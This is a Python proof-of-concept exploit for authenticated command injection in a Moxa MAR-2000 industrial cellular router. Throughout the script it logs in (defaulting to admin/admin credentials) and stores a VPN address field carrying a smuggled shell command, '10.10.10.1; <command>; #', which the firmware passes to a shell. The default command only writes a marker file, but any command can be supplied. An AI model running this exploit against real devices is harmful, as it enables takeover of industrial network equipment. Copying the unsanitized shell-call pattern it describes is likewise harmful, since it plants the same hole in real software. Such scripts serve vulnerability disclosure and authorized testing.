#!/usr/bin/env python3
"""
Moxa MAR-2000 series industrial cellular router (firmware FWR_MAR2000_V1.0_Build_15010909)

IPsec tunnel address command injection PoC.

The IPsec model (/home/model/network/ipsec/ipsec.py in the firmware) builds the
network management commands for a VPN tunnel from stored configuration values:

    cmd = 'ip addr add %s dev eth%s' % (localVpnIp + '/' + <subnet>, <iface>)
    cmd = 'ip route add to %s via %s src %s' % (<range>, localVpnIp, localVpnIp)
    return subprocess.call(cmd, shell=True)

The values are set through the authenticated REST resource
PUT /api/v1/network/ipsec. The model's clean_data() filters unknown dictionary
keys but never validates value content, so the localVpnIp field carries shell
metacharacters straight into those command lines. The stored values are
consumed when the IPsec service applies the tunnel configuration (service
start or restart).

This script drives the documented entry path:
    1. POST /api/login     -> administrator session
    2. GET  /api/v1/network/ipsec   -> read current tunnel configuration
    3. PUT  /api/v1/network/ipsec  -> tunnelModeTable.localVpnIp carrying
       "; <command>; #" in addition to the address field payload

Use only against hardware you own or are explicitly authorized to test. The
default command writes a marker file and reports nothing else.
"""

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.request


MARKER_PATH = "/tmp/mar2000_ipsec_marker"


def log(msg):
    print("[*] " + msg)


def ok(msg):
    print("[+] " + msg)


def err(msg):
    print("[!] " + msg)


def http_request(url, data=None, headers=None, method=None, timeout=15):
    """Send an HTTP request, return (status, body) with timeouts."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def login(base, username, password, timeout):
    """Login with the management credential pair and return the session cookie."""
    url = base + "/api/login"
    body = json.dumps({"username": username, "password": password}).encode("utf-8")
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        cookies = resp.headers.get_all("Set-Cookie") or []
        if resp.status == 200 and cookies:
            cookie = "; ".join(c.split(";")[0] for c in cookies)
            ok("login accepted for user %s" % username)
            return cookie
        err("login answered without a session cookie")
        return None
    except urllib.error.HTTPError as e:
        err("login failed with HTTP %d - credential pair rejected" % e.code)
        return None
    except Exception as e:
        err("login transport error: %s" % e)
        return None


def read_config(base, cookie, timeout):
    """Read the current IPsec tunnel configuration."""
    status, body = http_request(base + "/api/v1/network/ipsec",
                                headers={"Cookie": cookie}, timeout=timeout)
    if status == 200:
        ok("current IPsec configuration retrieved")
        return body
    if status == 401:
        err("configuration read rejected; session invalid")
    else:
        err("configuration read returned HTTP %s" % status)
    return None


def write_config(base, cookie, payload_ip, timeout):
    """Store the payload in tunnelModeTable.localVpnIp via the REST resource."""
    url = base + "/api/v1/network/ipsec"
    data = {
        "data": {
            "tunnelModeTable": {
                "localVpnIp": payload_ip,
                "localVpnSubnet": "255.255.255.0",
                "tunnelRemoteVpnIp": "10.10.10.10",
                "tunnelRemoteVpnSubnet": "255.255.255.0",
                "tunnelRemoteVpnInterface": "0"
            }
        }
    }
    body = json.dumps(data).encode("utf-8")
    status, resp = http_request(url, data=body,
                                headers={"Cookie": cookie,
                                          "Content-Type": "application/json"},
                                method="PUT", timeout=timeout)
    if status in (200, 201, 204):
        ok("tunnelModeTable.localVpnIp now stores the payload")
        return True
    err("configuration write returned HTTP %s: %s" % (status, resp[:200]))
    return False


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Moxa MAR-2000 IPsec tunnel address command injection PoC")
    parser.add_argument("--target", default="127.0.0.1",
                        help="management address of the router (default 127.0.0.1)")
    parser.add_argument("--user", default="admin", help="management username")
    parser.add_argument("--password", default="admin", help="management password")
    parser.add_argument("--cmd", default="id > " + MARKER_PATH,
                        help="shell command executed by the injection")
    parser.add_argument("--timeout", type=int, default=15, help="per-request timeout")
    args = parser.parse_args(argv)

    payload_ip = "10.10.10.1; %s; #" % args.cmd
    base = "http://%s" % args.target

    log("target %s, payload in tunnelModeTable.localVpnIp: %r" % (args.target, payload_ip))
    log("when the IPsec tunnel applies, the model runs commands equivalent to:")
    log("  ip addr add 10.10.10.1; %s; #/24 dev eth0" % args.cmd)
    log("  ip route add to <range> via 10.10.10.1; %s; # src 10.10.10.1; %s; #" % (args.cmd, args.cmd))

    cookie = login(base, args.user, args.password, args.timeout)
    if not cookie:
        return 2
    if read_config(base, cookie, args.timeout) is None:
        return 3
    if not write_config(base, cookie, payload_ip, args.timeout):
        return 4

    ok("stored; the address and route management sinks consume the stored value")
    ok("when the IPsec service applies the tunnel (start or restart)")
    ok("expected on-target evidence: %s containing the command output" % MARKER_PATH)
    return 0


if __name__ == "__main__":
    sys.exit(main())
